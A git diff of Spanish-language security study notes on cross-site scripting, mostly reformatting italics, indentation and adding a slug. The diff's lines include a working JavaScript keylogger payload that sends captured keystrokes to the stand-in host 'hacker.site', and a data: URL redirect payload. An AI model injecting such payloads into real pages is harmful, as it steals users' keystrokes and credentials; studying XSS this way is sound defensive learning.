@@ -3,6 +3,7 @@ title: 'Cross-Site Scripting (XSS)'
 description: ''
 pubDate: 'Jul 08 2022'
 heroImage: '/placeholder-hero.jpg'
+slug: vuln/xss
 ---
 
 ### Reflected XSS (server)
@@ -19,6 +20,7 @@ Welcome <?=$name?>
 ```
 
 ### Stored or Persistent XSS (server)
+
 La carga se ejecuta en todos los usuarios que visiten la página.
 El código es guardado por la app, sin sanitizar y luego rendereado.
 
@@ -44,10 +46,10 @@ if(@$_GET['admin'] == 1) {
 
 ### DOM XSS | Type-0 | Local XSS (client)
 
-Es dado cuando JavaScript usa los datos del usuario como parte de su lógica igual que *reflected* pero sin interactuar con el lado del servidor.
+Es dado cuando JavaScript usa los datos del usuario como parte de su lógica igual que _reflected_ pero sin interactuar con el lado del servidor.
 
 ```php
-# Toda la información del DOM esta disponible, URL, history, cookies, etc. 
+# Toda la información del DOM esta disponible, URL, history, cookies, etc.
 
 # Hay dos llaves fundamentales: SOURCES y SINKS
 <h1 id='welcome'></h1>
@@ -96,14 +98,13 @@ No aprovecha las fallas de la "App" sino de las extensiones, plugins.
 - Ataques de Red
 - Auto-XXS
 
-
 **Desfiguraciones**
 
 Con este ataque se intenta dar un mensaje preciso o información engañosa a los usuarios.
 
-*Virtul:* Si explotamos un defecto que no modifique el contenido hosteado en la web objetivo, entonces es un desfiguracion virtual. Esto pasa en XSS Reflejado
+_Virtul:_ Si explotamos un defecto que no modifique el contenido hosteado en la web objetivo, entonces es un desfiguracion virtual. Esto pasa en XSS Reflejado
 
-*Persistente:* En este caso la página es modificada permanentemente, el atacante no necesita engañar a los usuarios para que visiten una URL creada.
+_Persistente:_ En este caso la página es modificada permanentemente, el atacante no necesita engañar a los usuarios para que visiten una URL creada.
 
 **Phishing**
 
@@ -112,34 +113,33 @@ URLCrazy es una herramienta de linea de comandos que genera y prueba tipos de do
 **keylogging**
 
 ```javascript
-var keys=''
-document.onkeypress = function(e) {
-  var get = window.event ? event : e
-  var key = get.keyCode ? get.keyCode : get.charCode
-  key = String.fromCharCode(key)
-  keys += key
+var keys = ''
+document.onkeypress = function (e) {
+	var get = window.event ? event : e
+	var key = get.keyCode ? get.keyCode : get.charCode
+	key = String.fromCharCode(key)
+	keys += key
 }
 
 window.setInterval(() => {
-  if (keys !== '') {
-    var path = encodeURI("http://hacker.site/keylogger?k="+keys)
-    new Image().src = path
-    keys = ''
-  }
+	if (keys !== '') {
+		var path = encodeURI('http://hacker.site/keylogger?k=' + keys)
+		new Image().src = path
+		keys = ''
+	}
 }, 1000)
-
 ```
+
 Algunos frameworks:
 
-- *http_javascript_keylogger (Metasploit)*
-- *Event logger:* Es mas sofisticado
+- _http_javascript_keylogger (Metasploit)_
+- _Event logger:_ Es mas sofisticado
 
-****
+---
 
 data:text/html,<script>document.location="http://hacker.site"</script>
 
 javascript:{this.window='<script>document.location="https://google.com"</script>'}
-
 
 ### mXSS
 
